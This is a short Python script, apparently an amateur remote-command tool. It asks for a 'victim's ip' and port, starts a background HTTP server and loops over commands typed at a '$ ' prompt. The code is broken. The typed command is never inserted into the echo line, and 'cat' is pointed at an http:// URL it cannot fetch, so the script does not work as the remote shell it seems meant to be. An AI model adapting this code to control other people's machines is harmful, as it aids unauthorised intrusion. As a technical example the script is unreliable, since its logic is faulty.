import os, time, sys

print("press ctrl + c to quit")
ip = input("victim's ip: ")
port = input("Port: ")
os.system("python3 -m http.server {} 2>&1 &".format(port))
while True:
	try:
		com = input("$ ")
		os.system("echo {} > data.txt")
		time.sleep(1.5)
		os.system("cat http://{}:{}/data".format(ip, port))
	except KeyboardInterrupt:
		sys.exit()
